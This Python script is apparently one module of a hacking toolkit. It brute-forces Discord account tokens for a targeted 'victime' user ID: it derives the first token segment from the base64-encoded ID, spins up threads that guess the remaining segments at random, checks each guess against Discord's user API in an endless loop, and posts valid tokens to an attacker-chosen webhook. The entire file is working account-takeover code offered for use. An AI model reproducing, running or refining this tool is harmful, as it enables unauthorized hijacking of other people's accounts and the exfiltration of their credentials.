import os
import base64
import random
import string
import requests
import json
import threading

menu = """
          ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████   █████▒▒█████   ██▀███   ▄████▄  ▓█████
         ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
         ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███
         ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
         ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
         ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░ ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
         ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░ ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░
          ░    ░   ░░   ░  ░░░ ░ ░   ░         ░    ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░
          ░         ░        ░                 ░  ░           ░ ░     ░     ░ ░         ░  ░
               ░                                                            ░
"""
menu2 = """
[0] Back to main
[1] Brute Force Token
"""

def show_menu():
    print(f"\033[31m{menu}")
    print(f"\033[31m{menu2}\033[0m")

def brute_force():
    try:
        userid = input(f"\n\033[31mVictime ID >> \033[0m")
        OnePartToken = str(base64.b64encode(userid.encode("utf-8")), "utf-8")
        motifs = ["=", "==", "==="]
        for motif in motifs:
            if OnePartToken.endswith(motif):
                OnePartToken = OnePartToken[:-len(motif)]
        print(f'\033[31mPart One Token: {OnePartToken}\033[0m')

        brute = input(f"\033[31mFind the second part by brute force? (y/n) >> \033[0m")
        if brute.lower() not in ['y', 'yes']:
            return

        webhook = input(f"\033[31mWebhook? (y/n) >> \033[0m")
        if webhook.lower() in ['y', 'yes']:
            webhook_url = input(f"\033[31mWebhook URL >> \033[0m")
            print(f"\033[31mChecking Webhook: {webhook_url}\033[0m")

        try:
            threads_number = int(input(f"\033[31mThreads Number >> \033[0m"))
        except:
            print(f"\033[31mInvalid number\033[0m")
            return

        def send_webhook(embed_content):
            payload = {
                'embeds': [embed_content],
                'username': 'WebhookUsername',
                'avatar_url': 'WebhookAvatarURL'
            }
            headers = {'Content-Type': 'application/json'}
            requests.post(webhook_url, data=json.dumps(payload), headers=headers)

        def token_check():
            first = OnePartToken
            second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
            third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
            token = f"{first}.{second}.{third}"

            try:
                response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
                if response.status_code == 200:
                    if webhook.lower() == 'y':
                        embed_content = {
                            'title': f'Token Valid !',
                            'description': f"**Token:**\n```{token}```",
                            'color': 0x00FF00,
                            'footer': {"text": 'WebhookUsername', "icon_url": 'WebhookAvatarURL'}
                        }
                        send_webhook(embed_content)
                        print(f"\033[32mStatus: Valid Token: {token}\033[0m")
                    else:
                        print(f"\033[32mStatus: Valid Token: {token}\033[0m")
                else:
                    print(f"\033[31mStatus: Invalid Token: {token}\033[0m")
            except:
                print(f"\033[31mStatus: Error Token: {token}\033[0m")

        def request():
            threads = []
            try:
                for _ in range(threads_number):
                    t = threading.Thread(target=token_check)
                    t.start()
                    threads.append(t)
            except:
                print(f"\033[31mInvalid number\033[0m")
                return

            for thread in threads:
                thread.join()

        while True:
            request()
    except Exception as e:
        print(f"\033[31m[Error] {e}\033[0m")

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_menu()
        try:
            choice = int(input('\033[31mChoice >> \033[0m'))
            if choice == 0:
                os.system('python cyb3rtech.py')
                break
            elif choice == 1:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\033[31m{menu}\033[0m")
                brute_force()
            else:
                print("\033[31m[!]\033[0m Invalid choice \033[31m[!]\033[0m")
        except ValueError:
            print("\033[31mPlease enter a valid number\033[0m")
        input("\n\033[31mPress Enter to return to the menu...\033[0m")

if __name__ == "__main__":
    main()